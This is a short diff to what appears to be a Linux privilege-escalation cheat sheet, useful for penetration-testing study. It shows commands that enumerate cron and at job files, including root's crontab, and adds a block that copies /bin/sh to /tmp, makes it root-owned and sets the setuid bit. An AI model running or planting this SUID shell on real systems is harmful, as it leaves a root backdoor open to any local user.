@@ -57,3 +57,9 @@ ls -al /etc/cron* /etc/at*
 ```shell
 cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
 ```
+
+```bash
+cp /bin/sh /tmp
+chown root:root /tmp/sh
+chmod +s /tmp/sh
+```
